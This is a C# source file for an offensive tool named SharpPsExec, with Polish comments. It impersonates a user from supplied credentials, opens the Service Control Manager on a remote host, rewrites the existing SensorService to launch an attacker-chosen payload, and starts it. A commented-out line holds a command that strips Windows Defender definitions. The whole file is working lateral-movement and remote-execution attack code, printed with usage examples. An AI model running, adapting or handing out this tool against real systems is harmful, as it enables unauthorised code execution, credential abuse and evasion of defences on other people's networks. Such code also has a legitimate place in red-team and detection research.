using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace SharpPsExec
{
    internal class Program
    {
        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool LogonUser(
            string lpszUserName,
            string lpszDomain,
            string lpszPassword,
            int dwLogonType,
            int dwLogonProvider,
            out IntPtr phToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool RevertToSelf();

        // Logon types
        private const int LOGON32_LOGON_NEW_CREDENTIALS = 9;
        private const int LOGON32_PROVIDER_DEFAULT = 0;

        static void Main(string[] args)
        {
            // Sprawdzenie liczby argumentów
            if (args.Length < 2)
            {
                Console.Error.WriteLine("Usage: SharpPsExec.exe <target> <payload> [username] [password]");
                Console.Error.WriteLine("Examples:");
                Console.Error.WriteLine("  Current user:   SharpPsExec.exe file01 C:\\inject.exe");
                Console.Error.WriteLine("  With creds:     SharpPsExec.exe file01 C:\\inject.exe domain\\user password");
                Console.Error.WriteLine("  Local user:     SharpPsExec.exe file01 C:\\inject.exe user password");
                Environment.Exit(1);
            }

            String target = args[0];
            string payload = args[1];
            string username = args.Length > 2 ? args[2] : null;
            string password = args.Length > 3 ? args[3] : null;

            //string signature = "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All";

            IntPtr tokenHandle = IntPtr.Zero;
            bool impersonated = false;

            try
            {
                // Jeśli podano username i password, przeprowadź impersonację
                if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                {
                    string domain = ".";

                    // Jeśli username zawiera \, wydziel domenę
                    if (username.Contains("\\"))
                    {
                        string[] parts = username.Split('\\');
                        domain = parts[0];
                        username = parts[1];
                    }

                    Console.WriteLine($"[*] Attempting to impersonate user: {domain}\\{username}");

                    if (!LogonUser(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, out tokenHandle))
                    {
                        Console.Error.WriteLine($"[-] LogonUser failed: {GetLastErrorMessage()}");
                        Environment.Exit(1);
                    }

                    if (!ImpersonateLoggedOnUser(tokenHandle))
                    {
                        Console.Error.WriteLine($"[-] ImpersonateLoggedOnUser failed: {GetLastErrorMessage()}");
                        CloseHandle(tokenHandle);
                        Environment.Exit(1);
                    }

                    impersonated = true;
                    Console.WriteLine("[+] Successfully impersonated user");
                }

                Console.WriteLine($"[*] Connecting to target: {target}");
                IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);

                if (SCMHandle == IntPtr.Zero)
                {
                    Console.Error.WriteLine($"[-] OpenSCManager failed: {GetLastErrorMessage()}");
                    Environment.Exit(1);
                }

                string ServiceName = "SensorService";
                IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);

                if (schService == IntPtr.Zero)
                {
                    Console.Error.WriteLine($"[-] OpenService failed: {GetLastErrorMessage()}");
                    Environment.Exit(1);
                }

                Console.WriteLine($"[*] Configuring service with payload: {payload}");
                bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, null, null, null, null);

                if (!bResult)
                {
                    Console.Error.WriteLine($"[-] ChangeServiceConfigA failed: {GetLastErrorMessage()}");
                    Environment.Exit(1);
                }

                Console.WriteLine("[*] Starting service...");
                bResult = StartService(schService, 0, null);

                if (!bResult)
                {
                    Console.Error.WriteLine($"[-] StartService failed: {GetLastErrorMessage()}");
                    Environment.Exit(1);
                }

                Console.WriteLine("[+] Command executed successfully!");
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine($"[-] Error: {ex.Message}");
                Environment.Exit(1);
            }
            finally
            {
                // Przywróć oryginalny kontekst bezpieczeństwa
                if (impersonated)
                {
                    RevertToSelf();
                    Console.WriteLine("[*] Reverted to original security context");
                }

                // Zamknij token
                if (tokenHandle != IntPtr.Zero)
                {
                    CloseHandle(tokenHandle);
                }
            }
        }

        static string GetLastErrorMessage()
        {
            int errorCode = Marshal.GetLastWin32Error();
            return $"Error Code: {errorCode}";
        }
    }
}
